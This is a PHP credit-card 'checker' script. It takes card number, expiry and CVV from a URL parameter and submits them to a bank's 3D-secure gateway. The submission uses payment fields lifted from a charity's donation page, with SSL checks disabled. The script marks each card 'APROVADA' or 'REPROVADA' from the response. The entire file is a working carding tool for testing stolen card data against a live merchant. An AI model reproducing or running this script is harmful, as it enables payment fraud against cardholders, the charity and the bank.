<?php
error_reporting(0);

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

sleep(10);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://spos.isbank.com.tr/fim/est3Dgate');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: spos.isbank.com.tr',
'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
'Content-Type: application/x-www-form-urlencoded',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Referer: https://psa.darussafaka.org/',
    ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'pan='.$cc.'&clientid=700655366110&amount=5.00&oid=461643532f87bd7c545ee8a12d756215&okUrl=https%3A%2F%2Fpsa.darussafaka.org%2Ffestival-celebration-e-certificate%2Fis-bankasi%2Fsuccess&failUrl=https%3A%2F%2Fpsa.darussafaka.org%2Ffestival-celebration-e-certificate%2Fis-bankasi%2Ffailure&islemtipi=Auth&rnd=1fa90fbc3685248e9924ff686bbda879&hash=rdqL5cjKOaPYXF8b7fpslRI3unM%3D&storetype=3d&lang=en&currency=949&cardTypeCheck=false&Ecom_Payment_Card_ExpDate_Month='.$mes.'&Ecom_Payment_Card_ExpDate_Year='.$ano.'&cv2='.$cvv.'');
$pagamento = curl_exec($ch);

if (strpos($pagamento, 'https://www66.bb.com.br/SecureCodeAuth') || strpos($pagamento, 'auth.bb')){

echo "<b style='font-size:16px;'> <font style='color:yellow;'>$cc|$mes|$ano|$cvv|<font style='color: #09FE05 ;'>APROVADA</font></b>";
      }else{
       
echo "<b style='font-size:16px;' > <font style='color:red;'> $cc|$mes|$ano|$cvv|<font style='color: #FF0000 ;'>REPROVADA</font</font>";
      }

?>

